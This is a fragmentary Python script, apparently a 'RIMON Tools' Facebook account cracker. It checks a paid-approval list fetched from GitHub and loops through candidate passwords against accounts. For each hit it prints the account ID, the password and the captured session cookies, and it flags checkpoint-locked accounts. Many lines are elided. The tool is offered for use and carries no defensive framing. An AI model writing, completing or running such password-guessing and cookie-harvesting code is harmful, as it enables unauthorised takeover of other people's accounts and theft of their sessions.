...
princp=[]
try:
	prox= requests.get('https://github.com/RIMON-143/PAID/blob/main/Approve.txt').text
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/RIMON-143/PAID/blob/main/Approve.txt').text
		ua=open('.bbnew.txt','w')
...
os.system('espeak -a 300 " Welcome,   to,  RIMON,  Tools"')
#os.system('xdg-open https://www.facebook.com/RIMON.King.Ok.Bro')
def banner():
	os.system("clear")
	print (f"""
\033[1;92m
...
def login():
	...
	if RIMON in ['m']:
		...
		os.system('xdg-open https://wa.me/+8801624704417')
	elif RIMON in ['0']:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#RIMON-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•RIMON-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
